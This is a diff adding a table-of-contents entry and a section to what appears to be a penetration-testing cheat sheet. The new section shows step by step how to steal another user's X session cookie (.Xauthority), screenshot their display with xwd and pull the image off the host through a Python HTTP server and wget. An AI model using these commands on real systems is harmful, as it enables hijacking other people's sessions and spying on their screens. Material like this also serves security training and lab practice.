@@ -28,6 +28,8 @@
 19. [File Transfer](#19-file-transfer)
 20. [Quick Workflow](#20-quick-workflow)
 21. [Placeholder Reference](#21-placeholder-reference)
+22. [High-Value Checks Summary](#22-high-value-checks-summary)
+23. [X](#23-x)
 
 ---
 
@@ -1500,4 +1502,51 @@ cat /etc/crontab; ls -la /etc/cron.*
 
 ```bash id="6nuj4o"
 ss -tulpen
+```
+# 23. X 
+X is a portable, network-transparent window system for managing a windowed GUI. Essentially, when paired
+with a display manager, it serves as a full-fledged GUI which you can use to run programs that might not run
+headlessly.
+The presence of `.Xauthority` and `.xsession` files in a home directory indicate that a display might be
+configured, with the user potentially already authenticated. This theory is further supported by the fact that
+the display manager `LightDM` is found in the `/etc/passwd file`.
+The `.Xauthority` file is used to store credentials in the form of cookies used by xauth when
+authenticating X sessions. When a session is started, the cookie is then used to authenticate the subsequent
+connections to that specific display. With that in mind, if we can read the file using our newly created
+user, we can steal the cookie and therefore act as the authenticated other user and interact with the
+display
+
+Copy the `.Xauthority` Cookie in Base64:
+```bash
+cat /mnt/2/.Xauthority | base64
+```
+Wite the cookie to a temp file, and set as environment variable in the same system as another user:
+```bash
+echo AQAADHN<...SNIP...>S0xAoNm/oZZ4/ | base64 -d > /tmp/.Xauthority
+
+export XAUTHORITY=/tmp/.Xauthority
+```
+
+Check the current display you now have access to:
+```bash
+w
+```
+
+Take a screenshot of the current display:
+```bash
+xwd -root -screen -silent -display :0 > /tmp/screen.xwd
+```
+
+Set up a python server:
+```bash
+python3 -m http.server
+```
+
+Download the screenshot:
+```bash
+wget http://<TARGET_IP>:8000/screen.xwd
+```
+Finally convert the screenshot into a `.png`:
+```bash
+convert screen.xwd screen.png
 ```
